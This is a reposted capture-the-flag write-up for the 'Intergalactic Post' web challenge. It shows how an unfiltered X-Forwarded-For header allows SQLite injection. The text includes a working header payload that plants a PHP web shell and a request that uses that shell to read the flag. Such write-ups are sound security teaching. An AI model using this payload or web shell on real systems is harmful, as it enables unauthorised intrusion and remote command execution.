# :globe_with_meridians: Cyber Apocalypse CTF 2022 - Web - Intergalactic Post Write-up

> **Original Source:** [Cyber Apocalypse CTF 2022 - Web - Intergalactic Post Write-up](https://infosecwriteups.com/cyber-apocalypse-ctf-2022-web-intergalactic-post-write-up-9f2b1acc5386)
> **Platform:** infosecwriteups.com | **Category:** `WEB` | **Year:** 2022

---

# Cyber Apocalypse CTF 2022 — Web — Intergalactic Post Write-up


Prompt:


Intergalactic Post
The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie’s sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry?


Start:


It is a web challange and we have the source code of the application, so we are downloading it and building it to test it on our local before get the flag from the real website.


Firstly we are checking website and its functionality,


It requires an e-mail to subscribe..


When we give e-mail format input it accepts.


But when we give another format like test’, it does not accepts.


## Get zer0dac’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Let’s check the source code, what it is doing to our input and how filtering it.


When I check it, it was using filter_var function which is checking if it is in e-mail format.


I also researched this function if there is any sql injection, because as you can see in the below image, it writes our e-mail to the database.


I found the below link.


But this link can help for sqli login bypass with e-mail format. So in order to be sure, I edited the code as there is no filter_var function and I attack with sqlmap.


And yeah, I can get the tables etc.


But the other thing, I figure out, it also get our ip address and writes it to the database, and it hasn’t any filter function.


So, we can add the header to send our ip address.


You may check the below website for payload.


[http://atta.cked.me/home/sqlite3injectioncheatsheet](http://atta.cked.me/home/sqlite3injectioncheatsheet)


we use this header


```
X-Forwarded-For: blahblah','blahblah');ATTACH DATABASE '/www/lol.php' as lol;CREATE TABLE lol.pwn(dataz text); INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```


It accepts it as it is valid e-mail, but it is not checking the ip address if it is in correct format.


then we have a web shell at /lol.php and can do


```
[http://206.189.126.144:31604/lol.php?cmd=cat%20/flag*](http://206.189.126.144:31604/lol.php?cmd=cat+%2Fflag*)
```


---

*Originally published on [Medium](https://infosecwriteups.com/cyber-apocalypse-ctf-2022-web-intergalactic-post-write-up-9f2b1acc5386). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
